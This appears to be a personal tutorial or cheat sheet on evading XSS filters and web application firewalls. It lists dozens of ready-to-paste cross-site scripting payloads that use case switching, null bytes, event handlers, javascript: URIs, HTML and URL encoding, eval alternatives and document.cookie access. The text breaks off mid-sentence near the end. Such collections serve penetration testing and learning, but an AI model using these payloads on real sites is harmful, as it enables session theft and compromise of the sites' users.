<u><h2>Beating the XSS filters</h2></u>

when you inject a payload, alot of times they will
not always run. then don't give up.
we need to beat the XSS filters there are there types 
of xss filters:
1. Signature based filters
2. Sanitation or encoding based filters
3. fixed maximum length

<h3><b>1. defeating signature/blacklist-Based filters</b></h3>

signature based filters are also called blacklist based filters.

<b>ways of introducing script code</b>

there are four broad ways to:
<h4><b>1. Script Tags:</b></h4>
There are numerous ways you can obfuscate script injections using tags by using somewhat convoluted syntax to wrap
the use of tags:

```
<object data="javascript:alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```
<hr>

<h4>
<b>2. Weak Tag banning:</b>
</h4>

Its is possible to get around this by switching cases or 
weak rules 
```
<ScRiPt>alert(1);</ScRiPt> - Upper- & Lower-case characters
<ScRiPt>alert(1); - Upper- & Lower-case characters, without closing tag
<script/random>alert(1);</script> - Random string after the tag name
<script>alert(1);</script> - Newline after the tag name
<scr<script>ipt>alert(1)</scr<script>ipt> - Nested tags
<scr\x00ipt>alert(1)</scr\x00ipt> - NULL byte (IE up to v9)
```
<hr>

<h4>
<b>3. Numerous event handlers</b>
</h4>

Numerous event handlers can be used to by pass various 
black lists 

like
```
<style onload= alert(document.domain)//”>
<body onactivate=alert(1)>
<object type=image src=valid.gif onreadystatechange=alert(1)></object>
<img type=image src=valid.gif onreadystatechange=alert(1)>
<input type=image src=valid.gif onreadystatechange=alert(1)>
<isindex type=image src=valid.gif onreadystatechange=alert(1)>
```
<hr>

<h4>
<b>4. Script Pseudo-Protocols</b>
</h4>

pseudo script can be inserted to places where the tag expects a url can be used to place a inline script.
javascript is a pseudo-protocol that refers to unoffical URI scheme.

```
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
```

<hr>
<h4>
<b>5. Bypassing filters: HTML</b>
</h4>


switching to lesser known html tags methods of 
executing scripts. you need to obfuscate your payload
by introducing unexpected variation. 
signatures based filter attempts to block xss through 
regular expression. these regular extression identifies
common key HTML expression like tags, tags brackets, tag names, attribute names and attribute values.
many of these filters can be bypassed by placing unusual 
characters at key points with in the HTML in a way that 
browser can understand it(tolerate it).

You are supposed to modify the syntex in numerous ways 
and still have your code on at least one brower

consider the payload `<img onerror=alert(1) src=x>`
There are sever ways to modify this syntex to trick the WAF
or filter lets look at the numerous ways:

<b>The tag Name</b>

varing the character cases
```
<IMg onerror=alert(1) arc=x>
```

going further you can insert NULL byte at any position:

```
<[%00]img onerror=alert(1) src=a>
<i[%00]mg onerror=alert(1) src=a>
```
how do i recognize weather a website is using sanitation based filter or signature based filters

<b>null bytes</b>
null bytes are commonly used as a terminator for strings 
to there is a chance that WAF would stop reading 
certain characters after null byte

```
<scri%00pt>alert(1);</scri%00pt>
<scri\x00pt>alert(1);</scri%00pt>
<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
<scr\x00ipt>alert(1)</scr\x00ipt> - NULL byte (IE up to v9)
<img src='1' onerror\x00=alert(0) />
```


<b>Space following the tag name</b>


Several characters can replace space between the tags,
such as forward slash `/` 

```
<img/onerror=alert(1) src=a>
<img/src/onerror=alert(1)>
<svg+onload=alert(1337)>
<h1 id='xss'onmouseover='prompt(1)'>a
<style/onload=alert(1)>
```

you can also do URL decode,

you can substitute the space to separate attribute for

```
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09
```

<b> Attribute Names</b>
Within the attribute name, you can use the same NULL byte trick described earlier. This bypasses many simple ﬁlters that try to block event handlers by
blocking attribute names starting with on:

`<img o%00nerror=alert(1) src=a>`
`<img o\x00nerror=alert(1) src=a>`


<b>Switching attribute</b>
```
<img src=`a`onerror=alert(1)>
<iMg/src=a/onerror="alert(1)">
```

<b>attribute values</b>

```
<img onerror=a&#x6c;ert(1) src=a>
```

use cyberchef to do html encoding.

```
<img/src=a/onerror=&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;&#x28;1&#x29;>
<iframe src=&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;1&#x29;>
```


<b>Tag Brackets</b>

you can use url encoding to hide tag brackets

`<img onerror=alert(1) src=a>` becomes

```
%3Cimg%20onerror=alert(1)%20src=a%3E
```

you can do double encode

```
%253Cimg%2520onerror=alert(1)%2520src=a%253E
```


<b>mismatching tag brackets</b>
some filters identify HTML tags by simply 
matching and opening and closing angle brackets,
extrating the contents and comparing to black list 
your could confuse the parse by following trick.
```
<<script>alert(1);//<</script>
```
you could use superflurious brackets which browser would tolerate.

<b>unicode double angle</b>
when a unusual unicode characters into their nearest 
ASCII equivalents based on similarity of ther glyphs.

`%00AB img onerror=alert(1) src=a %00BB`

becomes 
`«img onerror=alert(1) src=a»`

there is a chance that some application that would 
translate quotation marks into brackets

<hr>
<h4>
<b>6. Bypassing filter: Script Code</b>
</h4>

There are filters that would block certain 
javascript keywords and expression to render them ineffective.
They may also block useful syntax such as dot, brackets and quotes.
one strategy is to use obfuscation 

<b>using JavaScript Escaping</b>

Within JavaScript strings, you can use Unicode escapes, hexadecimal escapes,
and octal escapes:

```
<script>eval('a\u006cert(1)');</script>
<script>eval('a\x6cert(1)');</script>
<script>eval('a\154ert(1)');</script>
```

use superfluous escape characters with in a string might be ignore:
```
<script>eval('a\l\ert\(1\)');</script>
```


<b>you can construct dynamically generated strings</b>

use techniques like this to construct strings:

```
<script>eval(‘al’+’ert(1)’);</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
```


<b>Alternatives to eval</b>

If directs call to eval fails, you have other ways
to execute commands in string form:

```
<script>’alert(1)’.replace(/.+/,eval)</script>
<script>function::[‘alert’](1)</script>
```

<b>Alternatives to dots</b>

if dots are not allowed to be accessed u could do this:

```
<script>alert(document['cookie'])</script>
<script>with(document)alert(cookie)</script>
```

<u><b>Combining Multiple techniques</b></u>

The techniques described can also be used in 
combination to apply several layers of obfuscation.


```
<img onerror=eval(‘al&#x5c;u0065rt(1)’) src=a>

<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&
#x29;&#x27;&#x29;
src=a>
```


<hr>
<hr>
<h3><b>2. Beating sanitization</b></h3>

This is the most common obstacle that i would 
encounter, this type of sanitization would 
modify or encode the payload to make it harmlesss. The firewall would also block/remove certain important characters like dots, brackets, quotes and tag characters.

The most prevalent manifestation of this sanitization is `<` becomes `&lt;` and `>` becomes `&gt;`

<h4><u>how to defeat it?</u></h4>

1. when encounter with this defense the first 
   step is to determine precisely which characters and expressions are being sanitized. 

2. construct payloads that wouldn't use characters that are blocked.

3. determine the context. use suitable
   event handlers. 

4. you should even consider all the techniques
   discussed earlier.

5. If a certain word is being remove try enclosing it with in another word.
```
<scr<script>ipt>alert(1)</script>
```

6. of `<script>` is being 



![[Pasted image 20230730182043.png]]





